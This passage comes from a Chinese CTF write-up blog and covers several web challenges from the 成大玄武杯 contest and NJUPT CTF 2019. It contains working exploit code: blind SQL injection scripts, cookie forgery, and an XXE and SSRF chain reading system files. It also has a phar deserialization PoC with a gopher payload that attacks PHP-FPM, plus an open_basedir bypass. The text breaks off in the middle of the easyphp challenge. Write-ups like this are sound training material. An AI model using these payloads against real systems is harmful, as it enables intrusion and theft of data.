<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-2.png" alt="3-2"></p>
<p>访问拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/3-3.png" alt="3-3"></p>
<h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/4-1.png" alt="4-1"></p>
<p>发现<code>password</code>处存在盲注，回显<code>Login Fail!</code>和<code>Login Success!</code></p>
<p><strong>EXP</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests,string</span><br><span class="line"></span><br><span class="line">all_string = string.printable</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.93.249.236:10001/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">	<span class="string">"password"</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#table:users</span></span><br><span class="line"><span class="comment">#column:id,username,password</span></span><br><span class="line"><span class="comment">#flag:flag&#123;sql1-wArn1ng&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> j in range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">		<span class="comment">#s = "0' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d #"%(i,j)</span></span><br><span class="line">		<span class="comment">#s = "0' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d #"%(i,j)</span></span><br><span class="line">		s = <span class="string">"0' or ascii(substr((select password from users where username='admin'),%d,1))=%d #"</span>%(i,j)</span><br><span class="line">		data[<span class="string">"password"</span>] = s</span><br><span class="line">		response = requests.post(url,data)</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"Login Success!"</span> in response.text):</span><br><span class="line">			flag = flag + str(chr(j))</span><br><span class="line">			<span class="keyword">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/4-2.png" alt="4-2"></p>
<h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-1.png" alt="5-1"></p>
<p>查看源码，有提示<code>hint.php</code>，查看发现如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctt</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$t=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($key);++$i)</span><br><span class="line">	&#123;</span><br><span class="line">		$t.=chr(ord($key[$i])^$i);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $t;</span><br><span class="line">&#125;</span><br><span class="line">$auth = <span class="keyword">false</span>;</span><br><span class="line">$role1 = <span class="string">"xxxxxxxxx"</span>;</span><br><span class="line">$salt = <span class="string">"xxxxxxxxxx"</span>;<span class="comment">//闀垮害涓嶈秴杩�15</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role_true"</span>])) &#123;</span><br><span class="line">    $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"role_true"</span>] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">        $auth = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $auth = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $s =$role1;</span><br><span class="line">    setcookie(<span class="string">'role'</span>,ctt(base64_encode($s)));</span><br><span class="line"></span><br><span class="line">    $hsh = md5($salt.ctt(base64_encode($s)));</span><br><span class="line">    setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only True Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下<code>cookie</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-2.png" alt="5-2"></p>
<p>因为<code>cookie</code>会自动<code>url编码</code>，所以需要先解码一下。先运行脚本得到<code>role1</code>的值为<code>adminadmin</code>。然后仔细观察，发现只要<code>urldecode($_COOKIE[&quot;role&quot;])</code>等于<code>ctt(base64_encode($s))</code>就能通过第二个条件，完整 EXP 如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctt</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$t=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($key);++$i)</span><br><span class="line">	&#123;</span><br><span class="line">		$t.=chr(ord($key[$i])^$i);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_decode(ctt(urldecode(<span class="string">"YVPweR3oRN%3B%7Bnj32"</span>))).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">"adminadmin"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(ctt(base64_encode($s)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后把得到的值拿去提交就行了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/5-3.png" alt></p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">no <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">$f1 = @$_GET[<span class="string">'f1'</span>];</span><br><span class="line">$f2 = @$_POST[<span class="string">'f2'</span>];</span><br><span class="line">$f3 = @$_COOKIE[<span class="string">'f3'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($f2 !== <span class="string">'0'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>($f1 == <span class="number">0</span> <span class="keyword">and</span> $f1 !== <span class="number">0</span>) &#123;</span><br><span class="line">        $f2 == $f3;</span><br><span class="line">        <span class="keyword">if</span>(md5($f2) == <span class="number">0</span> <span class="keyword">and</span> $f2 == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/成大玄武杯/8-1.png" alt="8-1"></p>
<p><code>$f2</code>和<code>$f3</code>全部传入字符串的<code>0</code>就可以了</p>
<h1 id="NJUPT-CTF-2019"><a href="#NJUPT-CTF-2019" class="headerlink" title="NJUPT CTF 2019"></a>NJUPT CTF 2019</h1><p>一共记录 11 道 Web 题目</p>
<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-1.png" alt="1-1"></p>
<p>抓到的请求当中，看到疑似<code>XXE</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-2.png" alt="1-2"></p>
<p>根据题目提示</p>
<blockquote>
<p>flag in /flag</p>
</blockquote>
<p>直接拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/1-3.png" alt="1-3"></p>
<h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>与上一题同样的界面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-1.png" alt="2-1"></p>
<p>尝试，但是相比之前，没有返回了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-2.png" alt="2-2"></p>
<p>但是可以读取其他文件，说明这里是 flag 的位置换了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-3.png" alt="2-3"></p>
<p>读取源码没看到可以利用的点，只能想到利用<code>xxe</code>进行<code>ssrf</code>打内网，扫描一下储存内网 IP 的几个文件：<code>/etc/hosts</code>，<code>/proc/net/arp</code>，<code>/proc/net/fib_trie</code>。然后在<code>ARP表</code>中发现很多内网 IP</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-4.png" alt="2-4"></p>
<p>通过<code>http://</code>协议访问<code>192.168.1.8</code>，直接拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/2-5.png" alt="2-5"></p>
<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-1.png" alt="3-1"></p>
<p>并且有弹窗提示</p>
<blockquote>
<p>try to make the sqlquery have its own results</p>
</blockquote>
<p>测试发现先对<code>POST</code>的值进行<code>URL解码</code>然后进行匹配，过滤了<code>in、-、#、&#39;、or、and、空格</code></p>
<p>无法使用任何注释符，只能是通过<code>反斜杠（\）</code>将原本接在 username 的后一个单引号给注释掉，然后 username 的前一个单引号与 password 的前一个单引号闭合。最后的单引号用<code>%00</code>截断掉 password 的第二个单引号（PHP 会判断 %00 为字符串结束符，所以字符串只到这里，最后的单引号会被当做不在字符串内，也就不传入 sql 语句中）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=123\&amp;passwd=||1;%00</span><br></pre></td></tr></table></figure>
<p>拼接后的字符串就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$string = <span class="string">"select * from users where username='123\' and passwd='||1;%00'"</span></span><br></pre></td></tr></table></figure>
<p>传入数据库部分就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where username=&apos;123\&apos; and passwd=&apos;||1;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-2.png" alt="3-2"></p>
<p>出现 302 跳转，跟随跳转后提示</p>
<blockquote>
<p>hello friend,go back to get the password</p>
</blockquote>
<p>那就回来从<code>passwd</code>变量注，但是过滤了许多关键词：<code>substr、mid、select、database</code>。截取字符串的函数只剩下<code>right、left</code>但是逗号却被过滤了，也无法使用。现在就只能使用<code>regexp</code>对每个字符逐一匹配</p>
<p>因为这里过滤了<code>单引号 &amp; 双引号</code>，所以我们自己构造的语句就无法匹配字符串</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-5.png" alt="3-5"></p>
<p>但是这可以用<code>十六进制代替</code>，因为<code>mysql</code>是接受<code>十六进制</code>的（前面要加0x），并且会将十六进制转<code>ASCII</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-4.png" alt="3-4"></p>
<p>先尝试<code>0x61（也就是 a）</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=123\&amp;passwd=||username/**/regexp/**/0x61;%00</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-6.png" alt="3-6"></p>
<p>发现之前的提示：<code>try to make the sqlquery have its own results</code>没了，说明是可以利用的。所以现在结合还可以使用的<code>ascii()</code>函数，写爆破 EXP：</p>
<p>Ps：① 因为直接传入<code>%00</code>会被黑名单检测到，所以这里的 python 代码中可以用<code>chr(0)</code>代替；② 因为有一次跑出来的结果是<code>er_know7788990</code>，发现是不完整的，于是手动注第一个字母（除了 e 之外，就是 0x79 了），再开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">all_strings = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span></span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:40005/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">"username"</span>:<span class="string">"123\\"</span>,</span><br><span class="line">	<span class="string">"passwd"</span>:<span class="string">"||passwd/**/regexp/**/0x79;"</span> + chr(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> all_strings:</span><br><span class="line">		response = requests.post(url=url,data=data)</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"try to make the sqlquery have its own results"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">"hack"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text):</span><br><span class="line">			print(data)</span><br><span class="line">			data[<span class="string">"passwd"</span>]  = data[<span class="string">"passwd"</span>][<span class="number">0</span>:<span class="number">-2</span>] + hex(ord(i))[<span class="number">-2</span>:] + <span class="string">";"</span> + chr(<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			data[<span class="string">"passwd"</span>] = data[<span class="string">"passwd"</span>][<span class="number">0</span>:<span class="number">-4</span>] + hex(ord(i))[<span class="number">-2</span>:] + <span class="string">";"</span> + chr(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-7.png" alt="3-7"></p>
<p>转换得到明文</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-8.png" alt="3-8"></p>
<p>任意用户名，然后用刚才注出来的密码登陆，拿下 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/3-3.png" alt="3-3"></p>
<h2 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-1.png" alt="4-1"></p>
<p>上传文件的地方，尝试后提示只能上传<code>jpg、png、gif、jpeg</code></p>
<blockquote>
<p>File is not an image.Sorry, only jpg,png,gif,jpeg are allowed.Sorry, your file was not uploaded.  </p>
</blockquote>
<p>可以通过添加jpg的文件头绕过，但是生成的文件后缀是<code>jpeg</code>，没有本地文件包含漏洞也无法使用</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-3.png" alt="4-3"></p>
<p>回想题目第一个提示</p>
<blockquote>
<p> I hate VIM. </p>
</blockquote>
<p>是 VIM 编辑留下的备份文件，可能会留下<code>.swp</code>的备份文件，尝试后发现<code>.catchmime.php.swp</code>，下载源码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-2.png" alt="4-2"></p>
<p>通过如下命令恢复<code>swp</code>备份文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi -r catchmime.php.swp</span><br></pre></td></tr></table></figure>
<p>看到如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $test; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $url; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123; </span><br><span class="line">        $ch = curl_init();   </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url); </span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>); </span><br><span class="line">        $output=curl_exec($ch); </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        <span class="keyword">return</span> $output; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]); </span><br><span class="line">    <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123; </span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]); </span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>unserialize()</code>只有一个，但是有2个类需要反序列化，但是有<code>getimagesize()</code>可以利用 phar 反序列化，构造如下 POC</p>
<p>Ps：这里要注意，上传的文件名后缀必须是jpeg，而且通过getimagesize函数检测文件类型是否是jpeg，所以在phar文件头部分加入一个jpg文件头部即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $test;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;test = <span class="string">'1'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $url;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;url = <span class="string">"file:///etc/passwd"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar_file = <span class="string">"knlvre.phar"</span>;</span><br><span class="line">unlink($phar_file);</span><br><span class="line"></span><br><span class="line">$e = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($e)).<span class="string">"\n"</span>;</span><br><span class="line">$f=<span class="keyword">new</span> Main();</span><br><span class="line"><span class="comment">//echo serialize($f);</span></span><br><span class="line">$jpg_header = hex2bin(<span class="string">'FFD8FFE000104A46494600010100000100010000FFDB004300080606070605080707070909080A0C140D0C0B0B0C1912130F141D1A1F1E1D1A1C1C20242E2720222C231C1C2837292C30313434341F27393D38323C2E333432FFDB0043010909090C0B0C180D0D1832211C213232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232FFC0'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar($phar_file);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub($jpg_header.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-4.png" alt="4-4"></p>
<p>将生成的<code>phar</code>文件后缀改为<code>jpeg</code>，然后上传</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-5.png" alt="4-5"></p>
<p>上传序列化字符串，然后phar协议访问上传的文件</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-6.png" alt="4-6"></p>
<p>修改<code>phar</code>内文件为<code>/etc/hosts</code>，再上传查看，发现只有记录<code>10.0.0.2</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-7.png" alt="4-7"></p>
<p>在换成<code>ARP表（/proc/net/arp）</code>，发现有两个内网IP</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-8.png" alt="4-8"></p>
<p>将生成phar文件的<code>Metadata</code>部分改为<code>http</code>协议，访问<code>10.0.0.3</code>。发现<code>FPM</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://10.0.0.3</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-9.png" alt="4-9"></p>
<p>接下来思路就是<code>ssrf+gopher打fpm</code>，参考文章：<a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">攻击PHP-FPM</a></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-10.png" alt="4-10"></p>
<p>然后将开头的<code>127.0.0.1</code>改为<code>10.0.0.3</code>，端口默认<code>9000</code>不用改，写入phar的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;url = <span class="string">"gopher://10.0.0.3:9000/_%01%01%E2U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E2U%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%E2U%00%00%00%00%01%05%E2U%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%E2U%00%00%00%00"</span>;</span><br></pre></td></tr></table></figure>
<p>上传然后访问，成功返回</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-11.png" alt="4-11"></p>
<p><code>open_basedir</code>是<code>/var/www/html:/tmp</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-12.png" alt="4-12"></p>
<p><code>disable_functions</code>如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,</span><br><span class="line">pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,</span><br><span class="line">pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,</span><br><span class="line">symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log,unlink,delete,copy,rmdir</span><br></pre></td></tr></table></figure>
<p>用绕过open_basedir的payload</p>
<p>Ps：还是要记得127.0.0.1改成10.0.0.3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php mkdir(&apos;/tmp/knlvre&apos;);chdir(&apos;/tmp/knlvre/&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(show_source(&apos;/flag&apos;))?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-13.png" alt="4-13"></p>
<p>上传访问，拿下flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/4-14.png" alt="4-14"></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/NJUPT/5-1.png" alt="5-1"></p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span 